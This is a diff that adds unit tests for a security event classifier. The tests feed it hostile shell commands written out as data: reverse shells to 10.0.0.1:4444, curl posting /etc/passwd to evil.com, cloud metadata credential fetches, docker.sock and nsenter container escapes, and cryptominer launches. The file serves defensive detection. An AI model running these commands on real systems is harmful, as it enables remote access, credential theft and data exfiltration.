@@ -308,6 +308,175 @@ class ClassificationTests(unittest.TestCase):
         self.assertEqual(classification["attack_category"], "command_execution")
         self.assertEqual(classification["severity"], "medium")
 
+    # ── New categories added 2025 ─────────────────────────────────────
+
+    # reverse_shell
+
+    def test_classifies_bash_dev_tcp_as_reverse_shell(self) -> None:
+        event = _make_command_event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reverse_shell")
+        self.assertEqual(classification["severity"], "high")
+
+    def test_classifies_nc_e_as_reverse_shell(self) -> None:
+        event = _make_command_event("nc -e /bin/bash 10.0.0.1 4444")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reverse_shell")
+
+    def test_classifies_python_socket_as_reverse_shell(self) -> None:
+        event = _make_command_event("python -c 'import socket,subprocess,os;s=socket.socket()'")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reverse_shell")
+
+    def test_classifies_mkfifo_reverse_shell(self) -> None:
+        event = _make_command_event("mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reverse_shell")
+
+    def test_reverse_shell_beats_obfuscation_for_dev_tcp(self) -> None:
+        """Reverse shell with /dev/tcp must classify as reverse_shell, not obfuscation."""
+        event = _make_command_event("sh -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reverse_shell")
+
+    # cloud_metadata_access
+
+    def test_classifies_aws_metadata_curl_as_cloud_metadata(self) -> None:
+        event = _make_command_event("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "cloud_metadata_access")
+        self.assertEqual(classification["severity"], "high")
+
+    def test_classifies_gcp_metadata_as_cloud_metadata(self) -> None:
+        event = _make_command_event("curl metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "cloud_metadata_access")
+
+    def test_classifies_aliyun_metadata_as_cloud_metadata(self) -> None:
+        event = _make_command_event("curl http://100.100.100.200/latest/meta-data/")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "cloud_metadata_access")
+
+    # data_exfiltration
+
+    def test_classifies_curl_post_as_data_exfil(self) -> None:
+        event = _make_command_event("curl -X POST -d @/etc/passwd http://evil.com/collect")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "data_exfiltration")
+        self.assertEqual(classification["severity"], "high")
+
+    def test_classifies_ngrok_as_data_exfil(self) -> None:
+        event = _make_command_event("./ngrok tcp 22")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "data_exfiltration")
+
+    def test_classifies_chisel_as_data_exfil(self) -> None:
+        event = _make_command_event("./chisel client evil.com:8080 R:1080:socks")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "data_exfiltration")
+
+    # lateral_movement
+
+    def test_classifies_sshpass_as_lateral_movement(self) -> None:
+        event = _make_command_event("sshpass -p 'admin' ssh root@10.0.1.5")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "lateral_movement")
+        self.assertEqual(classification["severity"], "high")
+
+    def test_classifies_ssh_keyscan_as_lateral_movement(self) -> None:
+        event = _make_command_event("ssh-keyscan 10.0.1.0/24 >> ~/.ssh/known_hosts")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "lateral_movement")
+
+    def test_classifies_rsync_as_lateral_movement(self) -> None:
+        event = _make_command_event("rsync -avz /data/ root@10.0.1.5:/backup/")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "lateral_movement")
+
+    # network_scan
+
+    def test_classifies_nmap_as_network_scan(self) -> None:
+        event = _make_command_event("nmap -sV 10.0.1.0/24")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "network_scan")
+        self.assertEqual(classification["severity"], "medium")
+
+    def test_classifies_masscan_as_network_scan(self) -> None:
+        event = _make_command_event("masscan 10.0.0.0/8 -p22,80,443 --rate=1000")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "network_scan")
+
+    def test_classifies_nc_scan_as_network_scan(self) -> None:
+        event = _make_command_event("nc -zv 10.0.1.5 22")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "network_scan")
+
+    # container_escape
+
+    def test_classifies_docker_sock_as_container_escape(self) -> None:
+        event = _make_command_event("docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine cat /host/etc/shadow")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "container_escape")
+        self.assertEqual(classification["severity"], "high")
+
+    def test_classifies_docker_privileged_as_container_escape(self) -> None:
+        event = _make_command_event("docker run -v /:/host --privileged alpine sh")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "container_escape")
+
+    def test_classifies_nsenter_as_container_escape(self) -> None:
+        event = _make_command_event("nsenter -t 1 -m -u -i -n -p sh")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "container_escape")
+
+    # Expanded markers for existing categories
+
+    def test_classifies_kinsing_as_cryptomining(self) -> None:
+        event = _make_command_event("./kinsing -pool pool.minexmr.com:4444")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "cryptomining")
+
+    def test_classifies_kdevtmpfsi_as_cryptomining(self) -> None:
+        event = _make_command_event("chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "cryptomining")
+
+    def test_classifies_setenforce_as_defense_evasion(self) -> None:
+        event = _make_command_event("setenforce 0")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "defense_evasion")
+
+    def test_classifies_iptables_flush_as_defense_evasion(self) -> None:
+        event = _make_command_event("iptables -F")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "defense_evasion")
+
+    def test_classifies_lsblk_as_reconnaissance(self) -> None:
+        event = _make_command_event("lsblk")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reconnaissance")
+
+    def test_classifies_lscpu_as_reconnaissance(self) -> None:
+        event = _make_command_event("lscpu")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "reconnaissance")
+
+    # Precedence: cloud_metadata beats credential_access for 169.254
+
+    def test_cloud_metadata_beats_credential_access(self) -> None:
+        """A curl to metadata containing 'credentials' should be cloud_metadata, not credential_access."""
+        event = _make_command_event("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "cloud_metadata_access")
+
+    # Precedence: data_exfil beats download for ngrok
+
+    def test_data_exfil_beats_download_for_curl_post(self) -> None:
+        """curl -X POST should be data_exfil, not malware_download."""
+        event = _make_command_event("curl -X POST -d @/tmp/data http://evil.com/collect")
+        classification = classify_event(event)
+        self.assertEqual(classification["attack_category"], "data_exfiltration")
+
 
 if __name__ == "__main__":
     unittest.main()
